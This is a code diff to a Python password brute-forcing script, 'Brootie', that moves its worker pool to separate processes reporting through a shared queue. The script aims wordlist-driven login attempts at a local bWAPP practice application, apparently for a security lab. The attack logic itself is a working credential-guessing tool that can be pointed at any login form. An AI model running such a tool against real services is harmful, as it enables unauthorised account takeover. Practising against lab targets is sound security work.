@@ -4,7 +4,8 @@ import threading
 from collections import deque
 import cursor
 import sys
-from multiprocessing import Pool
+listItem=list()
+from multiprocessing import Pool, Process ,Queue
 printLock=threading.Lock()
 counterVar=0
 cursor.hide()
@@ -28,7 +29,7 @@ def readWordLists(wordListFile, n):
                 break
     return wordLists
 class brute():
-    def __init__(self, name,targetString,post_request_key_values,targetKey,wordListFile,goalUrls,printLock):
+    def __init__(self, name,targetString,post_request_key_values,targetKey,wordListFile,goalUrls,printLock,q):
         self.name = name
         self.targetString=targetString
         self.post_request_key_values=post_request_key_values
@@ -36,6 +37,7 @@ class brute():
         self.wordListFile = wordListFile
         self.goalUrls=goalUrls
         self.printLock=printLock
+        self.q=q
 
     def bruteAttack(self):
         global counterVar
@@ -55,41 +57,53 @@ class brute():
                 if(x in solutionSet):
                     self.printLock.acquire()
                     print("\n")
-                    print(self.name+str(solutionSet[x])+":"+str(x))
+                    self.q.put(self.name+str(solutionSet[x])+":"+str(x))
                     counterVar+=1
                     self.printLock.release()
                 else:
                     printLock.acquire()
                     print("\n")
-                    print(self.name+"No Solutions for:"+str(x))
+                    self.q.put(self.name+"No Solutions for:"+str(x))
                     counterVar+=1
                     printLock.release()
 
         else:
             self.printLock.acquire()
             print("\n")
-            print(solutionSet)
+            self.q.put(solutionSet)
             counter+=1
             self.printLock.release()
-def launchBrutes(numberBrutes):
+
+def launchBrutes(numberBrutes,q):
     wordLists=readWordLists('bWAPPWL',numberBrutes)
-    p = Pool(numberBrutes)
-    p.map(launchBrutesHelper,wordLists)
+    processList=list()
+    for x in range(numberBrutes):
+        processList.append(Process(target=launchBrutesHelper,args=(wordLists[x],q)))
+    for x in range(numberBrutes):
+        processList[x].start()
+    return processList
 class loadBarThread (threading.Thread):
-        def __init__(self,lock):
+        def __init__(self,processList,stopFlag):
             threading.Thread.__init__(self)
-            self.printLock=lock
+            self.processList=processList
+            self.stopFlag=stopFlag
         def run(self):
-            loadingBar(self.printLock)
-def launchBrutesHelper(WL):
-    global printLock
-    myloadBarThread=loadBarThread(printLock)
-    myloadBarThread.start()
-    brootie=brute("Brootie","http://localhost/bWAPP/login.php",{'login':'bee','form':'submit'},"password",WL,['http://localhost/bWAPP/portal.php'],printLock)
+            loadingBar(self.processList,self.stopFlag)
+def launchBrutesHelper(WL,q):
+    global listItem
+
+    brootie=brute("Brootie","http://localhost/bWAPP/login.php",{'login':'bee','form':'submit'},"password",WL,['http://localhost/bWAPP/portal.php'],printLock,q)
     brootie.bruteAttack()
-def loadingBar(printLock):
-    global counterVar
-    while(counterVar!=1):
+def loadingBar(processList,stopFlag):
+    def allDone(processList):
+
+        for process in processList:
+            if(process.is_alive()==True):
+                return False
+        return True
+
+    while(allDone(processList)==False):
+
         printLock.acquire()
         print("\rLoading   ",end="")
         time.sleep(.5) #do some work here...
@@ -102,7 +116,20 @@ def loadingBar(printLock):
         print("\rLoading", end="")
         printLock.release()
         time.sleep(.5)
+    stopFlag.set()
+
 
 
 if __name__ == '__main__':
-    launchBrutes(5)
+    stopFlag=threading.Event()
+    q=Queue()
+    listItem=launchBrutes(5,q)
+    myloadBarThread=loadBarThread(listItem,stopFlag)
+    myloadBarThread.start()
+    stopFlag.wait()
+    for x in listItem:
+        b=x.join()
+        print(b)
+    while(q.empty()==False):
+        print(q.get())
+    print("Done")
